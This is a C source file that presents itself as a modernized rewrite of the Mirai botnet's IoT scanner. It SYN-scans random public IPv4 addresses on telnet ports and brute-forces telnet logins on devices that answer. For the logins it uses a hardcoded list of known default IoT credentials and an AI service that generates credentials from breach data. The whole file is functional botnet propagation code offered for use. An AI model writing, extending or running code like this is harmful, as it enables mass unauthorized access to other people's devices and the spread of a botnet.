/**
 * @file scanner_modern.c
 * @brief Modernized IoT device scanner with C17 standards and async I/O
 * 
 * This is a complete rewrite of the original Mirai scanner using:
 * - C17 standard features
 * - epoll-based async I/O for scalability
 * - Improved error handling and logging
 * - Modular architecture for testability
 * - Configuration-driven credential management
 * 
 * @author Mirai 2026 Project
 * @date 2026
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <pthread.h>

// Network headers
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <fcntl.h>

// epoll is Linux-only; on macOS/BSD stub it out so the file compiles.
// The scanner runs inside Docker (Linux) in production.
#if defined(__linux__)
#  include <sys/epoll.h>
#  include <linux/ip.h>
#else
// Minimal epoll stubs for non-Linux compilation
#  define EPOLLIN    0x001
#  define EPOLLOUT   0x004
#  define EPOLLERR   0x008
#  define EPOLLHUP   0x010
#  define EPOLLET    (1u << 31)
#  define EPOLL_CTL_ADD 1
#  define EPOLL_CTL_MOD 2
#  define EPOLL_CTL_DEL 3
typedef union epoll_data { void *ptr; int fd; } epoll_data_t;
struct epoll_event { uint32_t events; epoll_data_t data; };
static inline int epoll_create1(int f) { (void)f; return -1; }
static inline int epoll_ctl(int e, int o, int f, struct epoll_event *ev) {
    (void)e; (void)o; (void)f; (void)ev; return -1;
}
static inline int epoll_wait(int e, struct epoll_event *ev, int m, int t) {
    (void)e; (void)ev; (void)m; (void)t; return -1;
}
#endif

#include "scanner_modern.h"
#include "syn_scanner.h"
#include "telnet_state_machine.h"
#include "../common/logger.h"
#include "../common/config_loader.h"
#include "../common/util.h"
#include "../common/crypto.h"
#include "../ai_bridge/ai_bridge.h"

// Configuration constants
#define SCANNER_MAX_EVENTS      1024
#define SCANNER_EPOLL_TIMEOUT   1000  // milliseconds
#define SCANNER_CONN_TIMEOUT    30    // seconds
#define SCANNER_RDBUF_SIZE      4096
#define SCANNER_CREDENTIAL_MAX  256

// Connection states (modernized enum)
typedef enum {
    CONN_STATE_CLOSED = 0,
    CONN_STATE_CONNECTING,
    CONN_STATE_HANDLE_TELNET,
    CONN_STATE_WAIT_USERNAME,
    CONN_STATE_WAIT_PASSWORD,
    CONN_STATE_WAIT_SHELL,
    CONN_STATE_AUTHENTICATE,
    CONN_STATE_VERIFIED,
    CONN_STATE_ERROR
} connection_state_t;

// Credential structure
typedef struct {
    char username[64];
    char password[64];
    uint16_t weight;
    bool active;
} scanner_credential_t;

// Connection structure
typedef struct {
    int fd;
    connection_state_t state;
    struct sockaddr_in target;
    time_t last_activity;
    time_t connect_time;
    
    // Credential tracking
    scanner_credential_t *current_cred;
    uint8_t attempt_count;
    
    // Read buffer
    char rdbuf[SCANNER_RDBUF_SIZE];
    size_t rdbuf_pos;
    
    // Statistics
    uint64_t bytes_received;
    uint64_t bytes_sent;
} scanner_connection_t;

// Scanner context (global state)
typedef struct {
    int epoll_fd;
    int raw_socket;
    // BUG FIX (race condition): volatile sig_atomic_t ensures atomic read/write
    // of the running flag from any thread or signal handler without a mutex.
    volatile sig_atomic_t running;
    pthread_t thread_id;
    
    // Connection pool
    scanner_connection_t *connections;
    size_t max_connections;
    size_t active_connections;
    
    // Credentials
    scanner_credential_t credentials[SCANNER_CREDENTIAL_MAX];
    size_t credential_count;
    uint32_t total_credential_weight;
    
    // Statistics
    struct {
        uint64_t syns_sent;
        uint64_t connections_opened;
        uint64_t successful_auths;
        uint64_t failed_auths;
        uint64_t timeouts;
    } stats;
    
    // Configuration
    struct {
        uint32_t scan_rate;      // SYNs per second
        uint16_t target_ports[8];
        size_t port_count;
        bool aggressive_mode;
    } config;
} scanner_context_t;

// Global scanner instance
// BUG FIX (race condition): g_scanner->running must be accessed atomically.
// Use sig_atomic_t for the flag accessed from scanner_modern_stop() which
// may be called from a signal handler or a different thread.
static scanner_context_t *g_scanner = NULL;

// Forward declarations
static int scanner_init_epoll(scanner_context_t *ctx);
static int scanner_init_raw_socket(scanner_context_t *ctx);
static int scanner_load_credentials(scanner_context_t *ctx, const char *config_path);
static void scanner_send_syns(scanner_context_t *ctx);
static void scanner_handle_synack(scanner_context_t *ctx);
static int scanner_create_connection(scanner_context_t *ctx, struct sockaddr_in *target);
static void scanner_handle_event(scanner_context_t *ctx, struct epoll_event *event);
static void scanner_close_connection(scanner_context_t *ctx, scanner_connection_t *conn);
static scanner_credential_t *scanner_get_random_credential(scanner_context_t *ctx);
static uint32_t scanner_get_random_target_ip(void);
static bool scanner_is_valid_target_ip(uint32_t ip);

/**
 * Initialize the scanner module
 */
int scanner_modern_init(const char *config_path, size_t max_connections) {
    log_info("Initializing modern scanner module");
    
    if (g_scanner != NULL) {
        log_error("Scanner already initialized");
        return -1;
    }
    
    // Allocate scanner context
    g_scanner = calloc(1, sizeof(scanner_context_t));
    if (g_scanner == NULL) {
        log_error("Failed to allocate scanner context: %s", strerror(errno));
        return -1;
    }
    
    g_scanner->max_connections = max_connections;
    g_scanner->running = false;
    
    // Default configuration
    g_scanner->config.scan_rate = 1000;  // 1000 SYNs/sec
    g_scanner->config.target_ports[0] = 23;    // Telnet
    g_scanner->config.target_ports[1] = 2323;  // Alt telnet
    g_scanner->config.target_ports[2] = 22;    // SSH (for fingerprinting)
    g_scanner->config.port_count = 3;
    g_scanner->config.aggressive_mode = false;
    
    // Allocate connection pool
    g_scanner->connections = calloc(max_connections, sizeof(scanner_connection_t));
    if (g_scanner->connections == NULL) {
        log_error("Failed to allocate connection pool: %s", strerror(errno));
        free(g_scanner);
        g_scanner = NULL;
        return -1;
    }
    
    // Initialize all connections as closed
    for (size_t i = 0; i < max_connections; i++) {
        g_scanner->connections[i].fd = -1;
        g_scanner->connections[i].state = CONN_STATE_CLOSED;
    }
    
    // Initialize epoll
    if (scanner_init_epoll(g_scanner) < 0) {
        log_error("Failed to initialize epoll");
        goto cleanup_error;
    }
    
    // Initialize raw socket for SYN scanning
    if (scanner_init_raw_socket(g_scanner) < 0) {
        log_error("Failed to initialize raw socket");
        goto cleanup_error;
    }
    
    // Load credentials: try AI service first, fall back to built-ins
    if (scanner_load_credentials_from_ai(g_scanner) < 0) {
        if (scanner_load_credentials(g_scanner, config_path) < 0) {
            log_error("Failed to load credentials");
            goto cleanup_error;
        }
    }
    
    log_info("Scanner initialized: max_connections=%zu, credentials=%zu", 
             max_connections, g_scanner->credential_count);
    
    return 0;
    
cleanup_error:
    if (g_scanner->epoll_fd >= 0) close(g_scanner->epoll_fd);
    if (g_scanner->raw_socket >= 0) close(g_scanner->raw_socket);
    free(g_scanner->connections);
    free(g_scanner);
    g_scanner = NULL;
    return -1;
}

/**
 * Initialize epoll for async I/O
 */
static int scanner_init_epoll(scanner_context_t *ctx) {
    ctx->epoll_fd = epoll_create1(EPOLL_CLOEXEC);
    if (ctx->epoll_fd < 0) {
        log_error("epoll_create1() failed: %s", strerror(errno));
        return -1;
    }
    
    log_debug("Epoll initialized: fd=%d", ctx->epoll_fd);
    return 0;
}

/**
 * Initialize raw socket for SYN scanning
 */
static int scanner_init_raw_socket(scanner_context_t *ctx) {
    ctx->raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (ctx->raw_socket < 0) {
        log_error("Failed to create raw socket: %s", strerror(errno));
        log_warn("Note: Raw socket requires CAP_NET_RAW capability");
        return -1;
    }
    
    // Set IP_HDRINCL to craft custom IP headers
    int one = 1;
    if (setsockopt(ctx->raw_socket, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        log_error("Failed to set IP_HDRINCL: %s", strerror(errno));
        close(ctx->raw_socket);
        return -1;
    }
    
    // Set non-blocking
    int flags = fcntl(ctx->raw_socket, F_GETFL, 0);
    if (fcntl(ctx->raw_socket, F_SETFL, flags | O_NONBLOCK) < 0) {
        log_error("Failed to set raw socket non-blocking: %s", strerror(errno));
        close(ctx->raw_socket);
        return -1;
    }
    
    log_debug("Raw socket initialized: fd=%d", ctx->raw_socket);
    return 0;
}

/**
 * Load credentials from configuration
 * In production, this would integrate with the AI credential generator
 */
static int scanner_load_credentials(scanner_context_t *ctx, const char *config_path) {
    // For now, load some default credentials
    // TODO: Integrate with ai/credential_intel/generate.py
    
    struct {
        const char *user;
        const char *pass;
        uint16_t weight;
    } default_creds[] = {
        {"root", "xc3511", 10},
        {"root", "vizxv", 9},
        {"root", "admin", 8},
        {"admin", "admin", 7},
        {"root", "888888", 6},
        {"root", "default", 5},
        {"root", "123456", 5},
        {"admin", "password", 4},
        {"root", "root", 4},
        {"user", "user", 3},
        {NULL, NULL, 0}
    };
    
    ctx->credential_count = 0;
    ctx->total_credential_weight = 0;
    
    for (size_t i = 0; default_creds[i].user != NULL && i < SCANNER_CREDENTIAL_MAX; i++) {
        strncpy(ctx->credentials[i].username, default_creds[i].user, 
                sizeof(ctx->credentials[i].username) - 1);
        strncpy(ctx->credentials[i].password, default_creds[i].pass, 
                sizeof(ctx->credentials[i].password) - 1);
        ctx->credentials[i].weight = default_creds[i].weight;
        ctx->credentials[i].active = true;
        
        ctx->total_credential_weight += default_creds[i].weight;
        ctx->credential_count++;
    }
    
    log_info("Loaded %zu credentials (total weight: %u)", 
             ctx->credential_count, ctx->total_credential_weight);
    
    return 0;
}

/**
 * Main scanner loop
 */
void *scanner_modern_run(void *arg) {
    (void)arg;
    
    if (g_scanner == NULL) {
        log_error("Scanner not initialized");
        return NULL;
    }
    
    g_scanner->running = true;
    log_info("Scanner thread started");
    
    struct epoll_event events[SCANNER_MAX_EVENTS];
    time_t last_syn_time = time(NULL);
    
    while (g_scanner->running) {
        // Send SYN packets periodically
        time_t now = time(NULL);
        if (now > last_syn_time) {
            scanner_send_syns(g_scanner);
            last_syn_time = now;
        }
        
        // Check for SYN-ACK responses
        scanner_handle_synack(g_scanner);
        
        // Handle epoll events
        int nfds = epoll_wait(g_scanner->epoll_fd, events, SCANNER_MAX_EVENTS, 
                              SCANNER_EPOLL_TIMEOUT);
        
        if (nfds < 0) {
            if (errno == EINTR) continue;
            log_error("epoll_wait() failed: %s", strerror(errno));
            break;
        }
        
        // Process events
        for (int i = 0; i < nfds; i++) {
            scanner_handle_event(g_scanner, &events[i]);
        }
        
        // Timeout check for all connections
        now = time(NULL);
        for (size_t i = 0; i < g_scanner->max_connections; i++) {
            scanner_connection_t *conn = &g_scanner->connections[i];
            if (conn->state != CONN_STATE_CLOSED) {
                if (now - conn->last_activity > SCANNER_CONN_TIMEOUT) {
                    log_debug("Connection timeout: fd=%d, state=%d", conn->fd, conn->state);
                    g_scanner->stats.timeouts++;
                    scanner_close_connection(g_scanner, conn);
                }
            }
        }
    }
    
    log_info("Scanner thread stopping");
    log_info("Final stats: syns=%lu, conns=%lu, success=%lu, failed=%lu, timeouts=%lu",
             g_scanner->stats.syns_sent,
             g_scanner->stats.connections_opened,
             g_scanner->stats.successful_auths,
             g_scanner->stats.failed_auths,
             g_scanner->stats.timeouts);
    
    return NULL;
}

/**
 * Callback invoked by syn_scanner when a SYN-ACK is received.
 * Promotes the responding IP into a full TCP connection for telnet auth.
 */
static void on_synack_received(uint32_t src_ip, uint16_t src_port, void *user_data) {
    scanner_context_t *ctx = (scanner_context_t *)user_data;

    if (ctx->active_connections >= ctx->max_connections) {
        log_debug("Connection pool full, dropping SYN-ACK from %u.%u.%u.%u:%u",
                  (src_ip >> 24) & 0xFF, (src_ip >> 16) & 0xFF,
                  (src_ip >> 8)  & 0xFF, src_ip & 0xFF, src_port);
        return;
    }

    struct sockaddr_in target = {
        .sin_family      = AF_INET,
        .sin_addr.s_addr = htonl(src_ip),
        .sin_port        = htons(src_port),
    };

    scanner_create_connection(ctx, &target);
}

/**
 * Send a batch of SYN packets via the high-performance syn_scanner.
 * Wired to the real syn_scanner_send_batch() implementation.
 */
static void scanner_send_syns(scanner_context_t *ctx) {
    if (ctx->raw_socket < 0) return;

    // Build a lightweight syn_scanner_t wrapping our raw socket
    syn_scanner_t syn = {
        .raw_sock   = ctx->raw_socket,
        .epoll_fd   = ctx->epoll_fd,
        .local_ip   = 0,          // kernel chooses source IP
        .port_count = ctx->config.port_count,
    };
    for (size_t i = 0; i < ctx->config.port_count; i++) {
        syn.target_ports[i] = ctx->config.target_ports[i];
    }

    int sent = syn_scanner_send_batch(&syn, ctx->config.scan_rate);
    if (sent > 0) {
        ctx->stats.syns_sent += (uint64_t)sent;
        log_debug("Sent %d SYN packets", sent);
    }
}

/**
 * Receive SYN-ACK responses and promote responding hosts to full connections.
 */
static void scanner_handle_synack(scanner_context_t *ctx) {
    if (ctx->raw_socket < 0) return;

    syn_scanner_t syn = {
        .raw_sock   = ctx->raw_socket,
        .epoll_fd   = ctx->epoll_fd,
        .local_ip   = 0,
        .port_count = ctx->config.port_count,
    };
    for (size_t i = 0; i < ctx->config.port_count; i++) {
        syn.target_ports[i] = ctx->config.target_ports[i];
    }

    syn_scanner_recv_synacks(&syn, on_synack_received, ctx);
}

/**
 * Create a full TCP connection to a host that responded to our SYN.
 */
static int scanner_create_connection(scanner_context_t *ctx, struct sockaddr_in *target) {
    // Find a free slot in the connection pool
    scanner_connection_t *conn = NULL;
    for (size_t i = 0; i < ctx->max_connections; i++) {
        if (ctx->connections[i].state == CONN_STATE_CLOSED) {
            conn = &ctx->connections[i];
            break;
        }
    }
    if (conn == NULL) return -1;

    // Create non-blocking TCP socket
    int fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK | SOCK_CLOEXEC, 0);
    if (fd < 0) {
        log_error("socket() failed: %s", strerror(errno));
        return -1;
    }

    int ret = connect(fd, (struct sockaddr *)target, sizeof(*target));
    if (ret < 0 && errno != EINPROGRESS) {
        log_debug("connect() failed: %s", strerror(errno));
        close(fd);
        return -1;
    }

    // Initialise connection slot
    conn->fd             = fd;
    conn->state          = CONN_STATE_CONNECTING;
    conn->target         = *target;
    conn->last_activity  = time(NULL);
    conn->connect_time   = time(NULL);
    conn->attempt_count  = 0;
    conn->rdbuf_pos      = 0;
    conn->current_cred   = scanner_get_random_credential(ctx);

    // Register with epoll — EPOLLOUT fires when connect() completes
    struct epoll_event ev = {
        .events   = EPOLLOUT | EPOLLERR | EPOLLHUP,
        .data.ptr = conn,
    };
    if (epoll_ctl(ctx->epoll_fd, EPOLL_CTL_ADD, fd, &ev) < 0) {
        log_error("epoll_ctl ADD failed: %s", strerror(errno));
        close(fd);
        conn->fd    = -1;
        conn->state = CONN_STATE_CLOSED;
        return -1;
    }

    ctx->active_connections++;
    return 0;
}

/**
 * Load credentials from AI service (credential_intel) if available,
 * falling back to built-in defaults.
 */
static int scanner_load_credentials_from_ai(scanner_context_t *ctx) {
    if (!ai_bridge_is_available()) {
        log_info("AI service unavailable — using built-in credential list");
        return -1;
    }

    ai_credential_request_t req = {
        .breach_year_start = 2016,
        .breach_year_end   = 2026,
        .max_credentials   = SCANNER_CREDENTIAL_MAX,
    };
    strncpy(req.target_device, "iot-generic", sizeof(req.target_device) - 1);
    strncpy(req.target_os,     "linux",       sizeof(req.target_os) - 1);

    ai_credential_t ai_creds[SCANNER_CREDENTIAL_MAX];
    int count = ai_bridge_generate_credentials(&req, ai_creds, SCANNER_CREDENTIAL_MAX);
    if (count <= 0) {
        log_warn("AI credential generation returned %d — using defaults", count);
        return -1;
    }

    ctx->credential_count        = 0;
    ctx->total_credential_weight = 0;

    for (int i = 0; i < count && (size_t)i < SCANNER_CREDENTIAL_MAX; i++) {
        strncpy(ctx->credentials[i].username, ai_creds[i].username,
                sizeof(ctx->credentials[i].username) - 1);
        strncpy(ctx->credentials[i].password, ai_creds[i].password,
                sizeof(ctx->credentials[i].password) - 1);
        // Map confidence score (0.0–1.0) to weight (1–10)
        ctx->credentials[i].weight = (uint16_t)(ai_creds[i].confidence_score * 10.0f) + 1;
        ctx->credentials[i].active = true;
        ctx->total_credential_weight += ctx->credentials[i].weight;
        ctx->credential_count++;
    }

    log_info("Loaded %zu credentials from AI service", ctx->credential_count);
    return 0;
}

/**
 * Handle epoll event for a connection
 */
static void scanner_handle_event(scanner_context_t *ctx, struct epoll_event *event) {
    scanner_connection_t *conn = (scanner_connection_t *)event->data.ptr;
    
    if (event->events & EPOLLERR) {
        log_debug("Connection error: fd=%d", conn->fd);
        scanner_close_connection(ctx, conn);
        return;
    }
    
    if (event->events & EPOLLHUP) {
        log_debug("Connection hangup: fd=%d", conn->fd);
        scanner_close_connection(ctx, conn);
        return;
    }
    
    if (event->events & EPOLLIN) {
        // BUG FIX: Guard against NULL conn pointer — epoll may deliver an event
        // whose data.ptr was never set (e.g. for the raw_socket fd added to epoll).
        if (conn == NULL) {
            log_warn("EPOLLIN event with NULL connection pointer — skipping");
            return;
        }

        // Ensure the fd is still open before reading
        if (conn->fd < 0) {
            log_warn("EPOLLIN event on already-closed fd — skipping");
            return;
        }

        // Guard against buffer overflow
        if (conn->rdbuf_pos >= SCANNER_RDBUF_SIZE - 1) {
            log_warn("Read buffer full on fd=%d, draining", conn->fd);
            conn->rdbuf_pos = 0;
        }

        ssize_t n = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, 
                         SCANNER_RDBUF_SIZE - conn->rdbuf_pos - 1, 0);
        
        if (n < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                return;  // No data yet, not an error
            }
            log_debug("recv() error on fd=%d: %s", conn->fd, strerror(errno));
            scanner_close_connection(ctx, conn);
            return;
        }

        if (n == 0) {
            // Graceful close by remote
            log_debug("Remote closed connection: fd=%d", conn->fd);
            scanner_close_connection(ctx, conn);
            return;
        }
        
        conn->rdbuf_pos += (size_t)n;
        conn->rdbuf[conn->rdbuf_pos] = '\0';
        conn->bytes_received += (uint64_t)n;
        conn->last_activity = time(NULL);
        
        // Feed data to telnet state machine
        telnet_conn_t telnet_conn = {
            .fd       = conn->fd,
            .state    = (telnet_state_t)conn->state,
            .dst_addr = conn->target.sin_addr.s_addr,
            .dst_port = ntohs(conn->target.sin_port),
            .tries    = conn->attempt_count,
            .rdbuf_pos = (int)conn->rdbuf_pos,
        };
        memcpy(telnet_conn.rdbuf, conn->rdbuf, conn->rdbuf_pos);

        if (conn->current_cred != NULL) {
            telnet_credentials_t creds = {
                .username     = conn->current_cred->username,
                .username_len = strlen(conn->current_cred->username),
                .password     = conn->current_cred->password,
                .password_len = strlen(conn->current_cred->password),
            };
            int sm_result = telnet_state_machine_process(&telnet_conn, &creds);
            
            // Sync state back
            conn->state    = (connection_state_t)telnet_conn.state;
            conn->rdbuf_pos = (size_t)telnet_conn.rdbuf_pos;
            memcpy(conn->rdbuf, telnet_conn.rdbuf, conn->rdbuf_pos);

            if (sm_result == 1) {
                // Successful authentication
                log_info("Auth success: %s:%d user=%s",
                         inet_ntoa(conn->target.sin_addr),
                         ntohs(conn->target.sin_port),
                         conn->current_cred->username);
                ctx->stats.successful_auths++;
                scanner_close_connection(ctx, conn);
            } else if (sm_result == -1) {
                // Failed — try next credential
                ctx->stats.failed_auths++;
                conn->attempt_count++;
                scanner_credential_t *next_cred = scanner_get_random_credential(ctx);
                conn->current_cred = next_cred;
                telnet_connection_reset(&telnet_conn);
                conn->state = CONN_STATE_HANDLE_TELNET;
                conn->rdbuf_pos = 0;
            }
        }
    }
    
    if (event->events & EPOLLOUT) {
        // BUG FIX: NULL guard (same reasoning as EPOLLIN above)
        if (conn == NULL) {
            log_warn("EPOLLOUT event with NULL connection pointer — skipping");
            return;
        }

        if (conn->state == CONN_STATE_CONNECTING) {
            // Connection just established — check for errors
            int err = 0;
            socklen_t err_len = sizeof(err);
            if (getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len) < 0 || err != 0) {
                log_debug("Connect failed on fd=%d: %s", conn->fd, strerror(err ? err : errno));
                scanner_close_connection(ctx, conn);
                return;
            }

            // Connection established — move into telnet negotiation
            conn->state = CONN_STATE_HANDLE_TELNET;
            conn->last_activity = time(NULL);
            conn->current_cred = scanner_get_random_credential(ctx);

            // Switch epoll to edge-triggered read mode only
            struct epoll_event ev = {
                .events   = EPOLLIN | EPOLLET,
                .data.ptr = conn,
            };
            epoll_ctl(ctx->epoll_fd, EPOLL_CTL_MOD, conn->fd, &ev);

            log_debug("Connected to %s:%d",
                      inet_ntoa(conn->target.sin_addr),
                      ntohs(conn->target.sin_port));
            ctx->stats.connections_opened++;
        }
    }
}

/**
 * Close a connection and clean up
 */
static void scanner_close_connection(scanner_context_t *ctx, scanner_connection_t *conn) {
    if (conn->fd >= 0) {
        epoll_ctl(ctx->epoll_fd, EPOLL_CTL_DEL, conn->fd, NULL);
        close(conn->fd);
        conn->fd = -1;
    }
    
    conn->state = CONN_STATE_CLOSED;
    conn->rdbuf_pos = 0;
    memset(conn->rdbuf, 0, sizeof(conn->rdbuf));
    
    if (ctx->active_connections > 0) {
        ctx->active_connections--;
    }
}

/**
 * Get random credential based on weights
 */
static scanner_credential_t *scanner_get_random_credential(scanner_context_t *ctx) {
    if (ctx->credential_count == 0) {
        return NULL;
    }
    
    uint32_t r = rand() % ctx->total_credential_weight;
    uint32_t sum = 0;
    
    for (size_t i = 0; i < ctx->credential_count; i++) {
        sum += ctx->credentials[i].weight;
        if (r < sum && ctx->credentials[i].active) {
            return &ctx->credentials[i];
        }
    }
    
    return &ctx->credentials[0];
}

/**
 * Generate random target IP (avoiding reserved ranges)
 */
static uint32_t scanner_get_random_target_ip(void) {
    uint32_t ip;
    do {
        ip = (uint32_t)rand();
    } while (!scanner_is_valid_target_ip(ip));
    
    return ip;
}

/**
 * Check if IP is valid target (not in reserved ranges)
 */
static bool scanner_is_valid_target_ip(uint32_t ip) {
    uint8_t a = (ip >> 24) & 0xFF;
    uint8_t b = (ip >> 16) & 0xFF;
    
    // Exclude reserved ranges
    if (a == 0 || a == 127 || a >= 224) return false;
    if (a == 10) return false;
    if (a == 172 && b >= 16 && b <= 31) return false;
    if (a == 192 && b == 168) return false;
    
    return true;
}

/**
 * Stop the scanner
 */
void scanner_modern_stop(void) {
    if (g_scanner == NULL) return;
    
    log_info("Stopping scanner");
    g_scanner->running = false;
}

/**
 * Cleanup scanner resources
 */
void scanner_modern_cleanup(void) {
    if (g_scanner == NULL) return;
    
    log_info("Cleaning up scanner");
    
    // Close all connections
    for (size_t i = 0; i < g_scanner->max_connections; i++) {
        scanner_close_connection(g_scanner, &g_scanner->connections[i]);
    }
    
    if (g_scanner->epoll_fd >= 0) close(g_scanner->epoll_fd);
    if (g_scanner->raw_socket >= 0) close(g_scanner->raw_socket);
    
    free(g_scanner->connections);
    free(g_scanner);
    g_scanner = NULL;
    
    log_info("Scanner cleanup complete");
}
